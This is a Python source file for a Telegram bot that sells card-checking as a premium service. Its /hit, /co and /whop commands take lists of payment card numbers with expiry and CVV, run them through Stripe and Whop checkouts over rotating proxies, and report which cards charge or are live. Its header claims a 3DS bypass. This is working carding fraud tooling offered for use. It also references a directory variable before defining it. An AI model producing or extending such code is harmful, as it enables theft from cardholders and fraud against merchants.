import os
# hit_bot.py — /hit + /co command: Stripe/Whop checkout hitter (worker 3DS bypass)

import asyncio
import re
import time
import random
from html import escape as html_escape

from aiogram import types, F, Router

from database import get_user_credits, update_credits
from sub import get_premium_status
from autohitters.hitter import AsyncStripeChecker, test_proxy

router = Router()

MAX_CARDS = 10
PROXY_FILE = os.path.join(_SHOPIFY_DIR, "proxy.txt")

user_last_command_time = {}

# Premium emoji IDs — ONLY these exist in the bot's emoji set, so use only these.
E_LIGHTNING = "5085022089103016925"   # ⚡
E_DIAMOND   = "5359719332542718652"   # 💎
E_APPROVED  = "6044254523009012231"   # ✅
E_DECLINED  = "5893081007153746175"   # ❌
E_STAR      = "6136275172283391020"   # ⭐
E_CLOCK     = "5258419835922030550"   # 🕔
E_PURSE     = "5424976816530014958"   # 👛
E_TOP       = "5463071033256848094"   # 🔝
E_BAT       = "6136246765369694911"   # 🦇


def _tg(eid, text):
    return f'<tg-emoji emoji-id="{eid}">{text}</tg-emoji>'


def _load_proxies():
    try:
        with open(PROXY_FILE, encoding="utf-8", errors="ignore") as f:
            return [ln.strip() for ln in f if ln.strip() and not ln.strip().startswith("#")]
    except Exception:
        return []


def _pick_proxy():
    pool = _load_proxies()
    return random.choice(pool) if pool else None


async def _find_alive_proxy(max_tries=15):
    for _ in range(max_tries):
        p = _pick_proxy()
        if await test_proxy(p):
            return p
    return None


def _status_emoji(status):
    return {
        "CHARGED": _tg(E_DIAMOND, "💎"),
        "LIVE": _tg(E_APPROVED, "✅"),
        "DECLINED": _tg(E_DECLINED, "❌"),
        "3DS": _tg(E_LIGHTNING, "⚡"),
        "HCAPTCHA": _tg(E_BAT, "🦇"),
        "ERROR": _tg(E_DECLINED, "❌"),
    }.get(status, _tg(E_DECLINED, "❌"))


async def _check_one(checker, card, proxy):
    cc = card.split("|")
    card_data = {"full": card, "cc": cc[0], "month": cc[1], "year": "20" + cc[2][-2:], "cvv": cc[3]}
    t0 = time.time()
    r = await checker.check(card_data, proxy=proxy)
    r["elapsed"] = round(time.time() - t0, 1)
    return r


@router.message(F.text.startswith("/hit") | F.text.startswith("/co"))
async def hit_command(message: types.Message):
    user = message.from_user
    user_id = user.id
    now = time.time()
    if user_id in user_last_command_time and now - user_last_command_time[user_id] < 5:
        await message.reply("⚠️ <b>Slow down!</b>", parse_mode="HTML")
        return
    user_last_command_time[user_id] = now

    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    if not is_premium:
        await message.reply("💎 <b>Premium only.</b> Use /plan to upgrade.", parse_mode="HTML")
        return

    parts = message.text.split()[1:] if " " in message.text else []
    url = ""
    raw_cards = []
    if parts and parts[0].startswith("http"):
        url = parts[0]
        raw_cards = parts[1:]
    if message.reply_to_message:
        rt = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw_cards.extend(rt.split("\n"))

    if not url:
        await message.reply(
            "❌ <b>Usage:</b> /co <code>&lt;checkout_url&gt; &lt;card&gt; ...</code>\n"
            "or reply to a list of cards.",
            parse_mode="HTML"
        )
        return

    pat = re.compile(r'(\d{13,19})[\|/:\s]+(\d{1,2})[\|/:\s]+(\d{2,4})[\|/:\s]+(\d{3,4})')
    cards, seen = [], set()
    for item in raw_cards:
        m = pat.search(item)
        if m:
            cc, mm, yy, cvv = m.groups()
            mm = mm.zfill(2)
            if len(yy) == 4: yy = yy[2:]
            f = f"{cc}|{mm}|{yy}|{cvv}"
            if f not in seen:
                seen.add(f); cards.append(f)
    if not cards:
        await message.reply("⚠️ No valid cards found.", parse_mode="HTML")
        return
    cards = cards[:MAX_CARDS]

    credits = await asyncio.to_thread(get_user_credits, user_id)
    if credits is None or credits < 1:
        await message.reply("❌ <b>Insufficient Credits!</b>", parse_mode="HTML")
        return

    proc = await message.reply(f"{_tg(E_LIGHTNING, '⚡')} <b>Hitter starting…</b> ({len(cards)} cards)", parse_mode="HTML")
    asyncio.create_task(_run_hit(message, proc, user_id, url, cards))


async def _run_hit(message, proc, user_id, url, cards):
    proxy = await _find_alive_proxy()
    checker = AsyncStripeChecker(url, proxy=proxy)
    start = time.time()
    results = []
    meta = {"merchant": "", "product": "", "details": "", "amount": "", "success_url": "", "link": ""}

    for card in cards:
        r = await _check_one(checker, card, proxy)
        # dead proxy mid-run -> re-find a live one and retry once
        if r["status"] == "ERROR" and r.get("message") == "Could not init checkout":
            proxy = await _find_alive_proxy()
            r = await _check_one(checker, card, proxy)
        results.append(r)
        if not meta["merchant"] and r.get("merchant"):
            meta["merchant"] = r.get("merchant", "")
            meta["product"] = r.get("product", "")
            meta["details"] = r.get("details", "")
            meta["amount"] = r.get("amount", "")
            meta["success_url"] = r.get("success_url", "")
            meta["link"] = r.get("link", "")
        await _update_proc(proc, results, len(cards))

    await checker.close()

    bal = await asyncio.to_thread(get_user_credits, user_id)
    await asyncio.to_thread(update_credits, user_id, max(0, bal - len(cards)))

    elapsed = round(time.time() - start, 1)
    final = _build_final(results, meta, elapsed)
    try:
        await proc.edit_text(final, parse_mode="HTML", disable_web_page_preview=True)
    except Exception:
        await message.reply(final, parse_mode="HTML", disable_web_page_preview=True)


def _build_final(results, meta, elapsed):
    merchant = html_escape((meta["merchant"] or "—")[:60])
    product = html_escape((meta["product"] or "—")[:70])
    details = html_escape((meta["details"] or "—")[:70])
    amount = html_escape(meta["amount"] or "N/A")
    success_url = html_escape((meta["success_url"] or "")[:60])
    link = html_escape((meta["link"] or "")[:60])

    lines = [
        f"{_tg(E_LIGHTNING, '⚡')} <b>Stripe Hitter — Complete</b>",
        "━━━━━━━━━━━━━━━━",
        "<b>𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁</b>",
        f"{_tg(E_STAR, '⭐')} <b>𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁</b> ➠ {merchant}",
        f"{_tg(E_PURSE, '👛')} <b>𝗣𝗿𝗼𝗱𝘂𝗰𝘁</b> ➠ {product}",
        f"{_tg(E_DIAMOND, '💎')} <b>𝗔𝗺𝗼𝘂𝗻𝘁</b> ➠ {amount}",
        f"{_tg(E_TOP, '🔝')} <b>𝗗𝗲𝘁𝗮𝗶𝗹𝘀</b> ➠ {details}",
    ]
    if meta["success_url"]:
        lines.append(f"{_tg(E_APPROVED, '✅')} <b>𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗨𝗥𝗟</b> ➠ <code>{success_url}</code>")
    if meta["link"]:
        lines.append(f"{_tg(E_LIGHTNING, '⚡')} <b>𝗟𝗶𝗻𝗸</b> ➠ <code>{link}</code>")

    lines.append("━━━━━━━━━━━━━━━━")
    lines.append("<b>𝗖𝗮𝗿𝗱𝘀</b>")
    for i, r in enumerate(results, 1):
        emoji = _status_emoji(r["status"])
        msg = html_escape(str(r.get("message", "")))[:90]
        el = r.get("elapsed", 0)
        lines.append(f"{i}. <code>{html_escape(r['card'])}</code> → {emoji} <b>{msg}</b> ({el}s)")

    lines += [
        "━━━━━━━━━━━━━━━━",
        f"{_tg(E_APPROVED, '✅')} <b>𝗗𝗼𝗻𝗲</b> ➠ {len(results)}/{len(results)} checked",
        f"{_tg(E_CLOCK, '🕔')} <b>𝗧𝗼𝘁𝗮𝗹 𝘁𝗶𝗺𝗲</b> ➠ {elapsed}s",
        "━━━━━━━━━━━━━━━━",
        f"{_tg(E_STAR, '⭐')} <b>Bot by</b> <a href='https://t.me/Enchanted_linux_0x'>Enchanted_linux_0x</a>",
    ]
    return "\n".join(lines)


async def _update_proc(proc, results, total):
    text = (
        f"{_tg(E_LIGHTNING, '⚡')} <b>Hitter running…</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<b>Progress</b> ➠ {len(results)}/{total}\n"
        f"{_tg(E_DIAMOND, '💎')} <b>Charged</b> ➠ {sum(1 for r in results if r['status']=='CHARGED')}\n"
        f"{_tg(E_APPROVED, '✅')} <b>Live</b> ➠ {sum(1 for r in results if r['status']=='LIVE')}\n"
        f"{_tg(E_LIGHTNING, '⚡')} <b>3DS</b> ➠ {sum(1 for r in results if r['status']=='3DS')}\n"
        f"{_tg(E_DECLINED, '❌')} <b>Declined</b> ➠ {sum(1 for r in results if r['status']=='DECLINED')}\n"
        f"{_tg(E_BAT, '🦇')} <b>Error</b> ➠ {sum(1 for r in results if r['status']=='ERROR')}"
    )
    try:
        await proc.edit_text(text, parse_mode="HTML")
    except Exception:
        pass


# ---------------------------------------------------------------------------
# /whop — Whop checkout (Basis Theory -> Whop -> Stripe), via whop.worker.js for 3DS
# ---------------------------------------------------------------------------
from autohitters.whop import run_whop_check

_SHOPIFY_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))



@router.message(F.text.startswith("/whop"))
async def whop_command(message: types.Message):
    user = message.from_user
    user_id = user.id
    now = time.time()
    if user_id in user_last_command_time and now - user_last_command_time[user_id] < 5:
        await message.reply("⚠️ <b>Slow down!</b>", parse_mode="HTML")
        return
    user_last_command_time[user_id] = now

    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    if not is_premium:
        await message.reply("💎 <b>Premium only.</b> Use /plan to upgrade.", parse_mode="HTML")
        return

    parts = message.text.split()[1:] if " " in message.text else []
    url = ""
    raw_cards = []
    if parts and parts[0].startswith("http"):
        url = parts[0]
        raw_cards = parts[1:]
    if message.reply_to_message:
        rt = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw_cards.extend(rt.split("\n"))

    if not url:
        await message.reply("❌ <b>Usage:</b> /whop <code>&lt;whop_url&gt; &lt;card&gt; ...</code>", parse_mode="HTML")
        return

    pat = re.compile(r'(\d{13,19})[\|/:\s]+(\d{1,2})[\|/:\s]+(\d{2,4})[\|/:\s]+(\d{3,4})')
    cards, seen = [], set()
    for item in raw_cards:
        m = pat.search(item)
        if m:
            cc, mm, yy, cvv = m.groups()
            mm = mm.zfill(2)
            if len(yy) == 4: yy = yy[2:]
            f = f"{cc}|{mm}|{yy}|{cvv}"
            if f not in seen:
                seen.add(f); cards.append(f)
    if not cards:
        await message.reply("⚠️ No valid cards found.", parse_mode="HTML")
        return
    cards = cards[:MAX_CARDS]

    credits = await asyncio.to_thread(get_user_credits, user_id)
    if credits is None or credits < 1:
        await message.reply("❌ <b>Insufficient Credits!</b>", parse_mode="HTML")
        return

    proc = await message.reply(f"{_tg(E_LIGHTNING, '⚡')} <b>Whop Hitter starting…</b> ({len(cards)} cards)", parse_mode="HTML")
    asyncio.create_task(_run_whop_hit(message, proc, user_id, url, cards))


async def _run_whop_hit(message, proc, user_id, url, cards):
    proxy = await _find_alive_proxy()
    start = time.time()
    results = []
    meta = {"plan_name": "", "amount": "", "email": ""}

    for card in cards:
        r = await asyncio.to_thread(run_whop_check, url, card, "", proxy)
        r["card"] = card
        if r["status"] == "ERROR" and r.get("message") == "Could not load checkout page":
            proxy = await _find_alive_proxy()
            r = await asyncio.to_thread(run_whop_check, url, card, "", proxy)
            r["card"] = card
        results.append(r)
        if not meta["plan_name"] and r.get("plan_name"):
            meta["plan_name"] = r.get("plan_name", "")
            meta["amount"] = r.get("amount", "")
            meta["email"] = r.get("email", "")
        await _update_whop_proc(proc, results, len(cards))

    bal = await asyncio.to_thread(get_user_credits, user_id)
    await asyncio.to_thread(update_credits, user_id, max(0, bal - len(cards)))

    elapsed = round(time.time() - start, 1)
    final = _build_whop_final(results, meta, elapsed)
    try:
        await proc.edit_text(final, parse_mode="HTML", disable_web_page_preview=True)
    except Exception:
        await message.reply(final, parse_mode="HTML", disable_web_page_preview=True)


def _build_whop_final(results, meta, elapsed):
    plan = html_escape((meta["plan_name"] or "—")[:60])
    amount = html_escape(meta["amount"] or "N/A")
    email = html_escape((meta["email"] or "—")[:50])
    lines = [
        f"{_tg(E_LIGHTNING, '⚡')} <b>Whop Hitter — Complete</b>",
        "━━━━━━━━━━━━━━━━",
        "<b>𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁</b>",
        f"{_tg(E_STAR, '⭐')} <b>𝗣𝗹𝗮𝗻</b> ➠ {plan}",
        f"{_tg(E_DIAMOND, '💎')} <b>𝗔𝗺𝗼𝘂𝗻𝘁</b> ➠ {amount}",
        f"{_tg(E_PURSE, '👛')} <b>𝗘𝗺𝗮𝗶𝗹</b> ➠ {email}",
        "━━━━━━━━━━━━━━━━",
        "<b>𝗖𝗮𝗿𝗱𝘀</b>",
    ]
    for i, r in enumerate(results, 1):
        emoji = _status_emoji(r["status"])
        msg = html_escape(str(r.get("message", "")))[:90]
        lines.append(f"{i}. <code>{html_escape(r['card'])}</code> → {emoji} <b>{msg}</b>")
    lines += [
        "━━━━━━━━━━━━━━━━",
        f"{_tg(E_APPROVED, '✅')} <b>𝗗𝗼𝗻𝗲</b> ➠ {len(results)}/{len(results)} checked",
        f"{_tg(E_CLOCK, '🕔')} <b>𝗧𝗼𝘁𝗮𝗹 𝘁𝗶𝗺𝗲</b> ➠ {elapsed}s",
        "━━━━━━━━━━━━━━━━",
        f"{_tg(E_STAR, '⭐')} <b>Bot by</b> <a href='https://t.me/Enchanted_linux_0x'>Enchanted_linux_0x</a>",
    ]
    return "\n".join(lines)


async def _update_whop_proc(proc, results, total):
    text = (
        f"{_tg(E_LIGHTNING, '⚡')} <b>Whop Hitter running…</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<b>Progress</b> ➠ {len(results)}/{total}\n"
        f"{_tg(E_DIAMOND, '💎')} <b>Charged</b> ➠ {sum(1 for r in results if r['status']=='CHARGED')}\n"
        f"{_tg(E_APPROVED, '✅')} <b>Live</b> ➠ {sum(1 for r in results if r['status']=='LIVE')}\n"
        f"{_tg(E_DECLINED, '❌')} <b>Declined</b> ➠ {sum(1 for r in results if r['status']=='DECLINED')}\n"
        f"{_tg(E_BAT, '🦇')} <b>Error</b> ➠ {sum(1 for r in results if r['status']=='ERROR')}"
    )
    try:
        await proc.edit_text(text, parse_mode="HTML")
    except Exception:
        pass
